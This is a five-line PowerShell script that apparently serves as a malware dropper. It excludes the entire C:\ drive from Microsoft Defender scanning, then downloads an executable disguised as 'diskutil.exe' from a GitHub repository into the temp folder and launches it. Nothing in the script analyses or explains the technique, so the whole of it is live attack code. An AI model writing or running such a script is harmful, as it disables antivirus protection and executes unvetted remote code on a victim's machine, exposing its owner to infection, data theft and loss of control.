Add-MpPreference -ExclusionPath C:\
$url = "https://github.com/rsvgsng/funpark/raw/refs/heads/main/diskutil.exe"
$output = "$env:Temp/diskutil.exe"
Invoke-WebRequest -Uri $url -OutFile $output
Start-Process -FilePath $output
